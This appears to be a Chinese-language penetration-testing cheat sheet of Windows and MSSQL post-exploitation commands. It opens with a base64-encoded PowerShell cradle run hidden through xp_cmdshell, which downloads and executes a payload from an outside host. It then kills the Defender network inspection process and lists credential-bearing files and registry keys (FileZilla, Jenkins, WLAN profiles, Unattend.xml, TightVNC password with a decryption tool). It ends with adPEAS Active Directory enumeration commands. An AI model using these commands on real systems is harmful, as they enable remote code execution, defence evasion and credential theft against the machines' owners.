# 加密的mssql命令
使用powershell encode上面的字符串

```
PS C:\Users\max> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.17.231:8080/w1"))'
PS C:\Users\max> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADcALgAyADMAMQA6ADgAMAA4ADAALwB3ADEAIgApACkA
```

使用上面的加密串在msqll server执行下面的命令

格式：
```
EXEC xp_cmdshell 'powershell -w hidden -enc <这里是加密命令>
```

# 杀进程
```
tasklist /FI "IMAGENAME eq NisSrv.exe"


taskkill /pid 5672 -f

```





# Juicy files

## All user folders
## Limit this command if there are too many files ;)
```
tree /f /a C:\Users
```

## Web.config
```
C:\inetpub\www\*\web.config
```

## Unattend files
```
C:\Windows\Panther\Unattend.xml
```


## RDP config files
```
C:\ProgramData\Configs\
```


## Powershell scripts/config files
```
C:\Program Files\Windows PowerShell\
```


## PuTTy config
```
C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty
```

## FileZilla creds
```
C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml
```

## Jenkins creds (also check out the Windows vault, see above)
```
C:\Program Files\Jenkins\credentials.xml
```


## WLAN profiles
```
C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml
```

## TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)
```
Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password
```



# adPEAS

## 引入
```
powershell-import tools/adPEAS/adPEAS.ps1
```
或者
```
. .\adPEAS.ps1
```

或者
```
Import-Module .\adPEAS.ps1
```

## 执行
```
Invoke-adPEAS
```

```
Invoke-adPEAS -Domain 'm3c.local' -Outputfile 'C:\ActiveMQ\m3c_adPEAS_outputfile' 
```